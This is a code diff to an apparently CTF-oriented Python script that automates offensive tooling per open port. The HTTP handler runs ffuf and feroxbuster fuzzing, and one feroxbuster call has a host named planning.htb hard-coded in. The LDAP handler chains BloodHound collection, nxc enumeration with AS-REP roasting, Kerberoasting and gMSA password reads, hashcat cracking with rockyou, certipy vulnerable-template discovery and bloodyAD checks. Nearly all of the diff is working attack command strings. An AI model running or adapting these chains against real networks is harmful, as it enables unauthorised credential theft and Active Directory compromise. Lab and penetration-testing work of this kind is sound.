@@ -93,7 +93,7 @@ def dns_tasks(context):
 
 @port_registry.register_port_handler(80)
 def http_tasks(context):
-    target = context.vhost or context.domain
+    target = context.get_target()
     if target:
         run_task(context, f"firefox 'http://{target}' &> /dev/null & disown; ffuf -w /usr/share/seclists/Discovery/DNS/services-names.txt -u http://{target} -H 'Host: FUZZ.{target}' -ac -c; ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://{target} -H 'Host: FUZZ.{target}' -ac -c; ffuf -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt -u http://{target}/FUZZ -ac -c; ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -u http://{target}/FUZZ -ac -c; feroxbuster -u http://planning.htb")
     else:
@@ -112,10 +112,12 @@ def kerberos_tasks(context):
 @port_registry.register_port_handler(389)
 def ldap_tasks(context):
     context.is_ad = True
+    target = context.get_target()
     if context.creds_exist():
         user, passwd = context.get_initial_cred()
-        run_task(context, f"rusthound -d {context.domain} -u {user}@{context.domain} -p '{passwd}' -f {context.hostname}.{context.domain} -n {context.ip} -z -o rusthound; faketime \"$(rdate -n {context.ip} -p | awk '{{print $2, $3, $4}}' | date -f - \"+%Y-%m-%d %H:%M:%S\")\" nxc ldap {context.ip} -u {user} -p '{passwd}' --users --find-delegation --trusted-for-delegation --asreproast hashes.asreproast --kerberoasting hashes.kerberoast; nxc ldap {context.ip} -u {user} -p '{passwd}' --gmsa; hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt --force; hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt --force")
-        run_task(context, f"bloodyAD --host {context.ip} -u {user} -p '{passwd}' get writable; certipy find -enabled -u {user}@{context.domain} -p '{passwd}' -dc-ip {context.ip} -stdout -timeout 2; certipy find -vulnerable -u {user}@{context.domain} -p '{passwd}' -dc-ip {context.ip} -stdout -timeout 2; powerview {context.domain}/{user}:'{passwd}'@{context.ip}")
+        run_task(context, f"bloodhound.py --zip -c All -d {context.domain} -dc {target} -ns {context.ip} -u {user} -p '{passwd}'; faketime \"$(rdate -n {context.ip} -p | awk '{{print $2, $3, $4}}' | date -f - \"+%Y-%m-%d %H:%M:%S\")\" nxc ldap {context.ip} -u {user} -p '{passwd}' --users --find-delegation --trusted-for-delegation --asreproast hashes.asreproast --kerberoasting hashes.kerberoast; nxc ldap {context.ip} -u {user} -p '{passwd}' --gmsa; hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt --force; hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt --force")
+        run_task(context, f"certipy find -u {user}@{context.domain} -p '{passwd}' -target {target} -dc-ip {context.ip} -stdout -timeout 2 -enabled; certipy find -u {user}@{context.domain} -p '{passwd}' -target {target} -dc-ip {context.ip} -stdout -timeout 2 -vulnerable; bloodyAD --host {context.ip} -u {user} -p '{passwd}' get writable; powerview {context.domain}/{user}:'{passwd}'@{context.ip} --web")
+        run_task(context, "neo4j start; sleep 5; bloodhound &> /dev/null & disown")
     else:
         try:
             # Check anonymous bind
@@ -123,8 +125,7 @@ def ldap_tasks(context):
             conn.login()
             conn.search('', searchFilter="(userAccountControl:1.2.840.113556.1.4.803:=8192)", attributes=['objectSid'])
             write_log(context.log_file, f"LDAP anonymous bind is enabled", "SUCCESS")
-            target = context.get_target()
-            run_task(context, f"nxc ldap {target} -u '' -p '' --kerberoasting hashes.kerberoast --find-delegation --trusted-for-delegation --password-not-required --users --groups --dc-list; hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt --force")
+            run_task(context, f"nxc ldap {target} -u '' -p '' --kerberoasting hashes.kerberoast --find-delegation --trusted-for-delegation --password-not-required --users --groups --dc-list --gmsa; hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt --force")
             run_task(context, f"powerview {target}")
         except Exception as e:
             return
